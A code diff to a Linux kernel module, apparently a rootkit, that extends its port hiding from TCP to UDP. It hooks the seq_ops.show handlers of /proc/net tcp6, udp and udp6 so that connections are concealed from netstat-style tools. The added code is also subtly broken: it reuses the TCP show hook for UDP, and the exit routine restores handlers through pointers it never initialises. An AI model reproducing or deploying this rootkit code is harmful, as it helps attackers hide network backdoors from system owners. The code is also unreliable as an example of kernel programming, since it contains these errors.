@@ -3,6 +3,7 @@
 #include <linux/proc_fs.h>
 #include <linux/init.h>
 #include <net/tcp.h>
+#include <net/udp.h>
 
 /*from net/ipv4/tcp_ipv4.c*/
 #define TMPSZ 150
@@ -40,6 +41,9 @@ struct proc_dir_entry {
 
 int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
 int (*old_tcp6_seq_show)(struct seq_file*, void *) = NULL;
+int (*old_udp4_seq_show)(struct seq_file*, void *) = NULL;
+int (*old_udp6_seq_show)(struct seq_file*, void *) = NULL;
+
 
 char *strnstr(const char *haystack, const char *needle, size_t n)
 {
@@ -88,6 +92,9 @@ static int __init myinit(void)
 	struct proc_dir_entry *proc_dir_entryptr;
 	struct tcp_seq_afinfo *tcp_seq;
 	struct tcp_seq_afinfo *tcp6_seq;
+	struct udp_seq_afinfo *udp_seq;
+	struct udp_seq_afinfo *udp6_seq;
+	
 	
 	/* Get the proc dir entry for /proc/<pid>/net */
 	proc_rb_root = init_net.proc_net->subdir;
@@ -113,7 +120,21 @@ static int __init myinit(void)
 			/* Hook the kernel function tcp4_seq_show */
 			tcp6_seq->seq_ops.show = hacked_tcp4_seq_show;
 		}
-		
+		else if (!strcmp(proc_dir_entryptr->name, "udp")) {
+			udp_seq = proc_dir_entryptr->data;
+			old_udp4_seq_show = udp_seq->seq_ops.show;
+
+			/* Hook the kernel function tcp4_seq_show */
+			udp_seq->seq_ops.show = hacked_tcp4_seq_show;
+		}
+		else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
+			udp6_seq = proc_dir_entryptr->data;
+			old_udp6_seq_show = udp6_seq->seq_ops.show;
+
+			printk(KERN_INFO "HIDE PORT: FOUND UDP6");
+			/* Hook the kernel function tcp4_seq_show */
+			udp6_seq->seq_ops.show = hacked_tcp4_seq_show;
+		}	
 		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
 	}
 				                        
@@ -135,6 +156,9 @@ static void myexit(void)
 	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
 	struct proc_dir_entry *proc_dir_entryptr;
 	struct tcp_seq_afinfo *tcp_seq;
+	struct tcp_seq_afinfo *tcp6_seq;
+	struct udp_seq_afinfo *udp_seq;
+	struct udp_seq_afinfo *udp6_seq;
 
 	/* Get the proc dir entry for /proc/<pid>/net */
 	proc_rb_root = init_net.proc_net->subdir;
@@ -147,7 +171,15 @@ static void myexit(void)
 		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
 			tcp_seq->seq_ops.show = old_tcp4_seq_show;
 		}
-		
+		else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
+			tcp6_seq->seq_ops.show = old_tcp6_seq_show;
+		}
+		else if (!strcmp(proc_dir_entryptr->name, "udp")) {
+			udp_seq->seq_ops.show = old_udp4_seq_show;
+		}
+		else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
+			udp6_seq->seq_ops.show = old_udp6_seq_show;
+		}	
 		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
 	}						                
 }
